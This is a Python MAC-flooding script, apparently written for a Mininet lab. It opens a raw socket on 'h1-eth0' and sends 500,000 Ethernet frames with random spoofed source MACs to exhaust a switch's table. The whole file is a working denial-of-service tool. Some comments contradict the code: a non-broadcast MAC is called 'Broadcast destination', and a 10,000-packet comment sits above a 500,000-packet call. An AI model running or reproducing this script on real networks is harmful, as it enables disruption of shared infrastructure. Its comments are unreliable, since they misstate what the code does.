import socket
import struct
import random
import time

def generate_random_mac():
    # Generates a random MAC address byte array
    return [random.randint(0x00, 0xff) for _ in range(6)]

def run_attack(interface, num_packets):
    print(f"[*] Starting high-speed MAC flood on {interface}...")
    
    # Create a raw socket that talks directly to the hardware
    try:
        s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW)
        s.bind((interface, 0))
    except PermissionError:
        print("[!] Error: Must run as root (or inside Mininet CLI).")
        return

    packets_sent = 0
    start_time = time.time()

    try:
        for _ in range(num_packets):
            # To saturate the switch, we spoof a completely new Source MAC every time
            src_mac = generate_random_mac()
            dst_mac = [0x00, 0x00, 0x00, 0x00, 0x00, 0x02] # Broadcast destination
            
            # Pack the raw Ethernet header: Dest MAC (6 bytes), Src MAC (6 bytes), Type (IPv4=0x0800)
            eth_header = struct.pack("!6B6BH", *dst_mac, *src_mac, 0x0800)
            
            # Add a tiny dummy payload to complete the frame
            payload = b'\x00' * 46 
            packet = eth_header + payload
            
            # Fire the packet directly into the wire
            s.send(packet)
            packets_sent += 1
            
    except KeyboardInterrupt:
        print("\n[*] Attack aborted by user.")

    elapsed = time.time() - start_time
    rate = packets_sent / elapsed
    print(f"[*] ATTACK COMPLETE")
    print(f"[*] Sent {packets_sent} packets in {elapsed:.2f} seconds.")
    print(f"[*] Average Rate: {rate:.0f} packets/second")

if __name__ == '__main__':
    # We will blast 10,000 packets to guarantee a flow table explosion
    run_attack("h1-eth0", 500000)
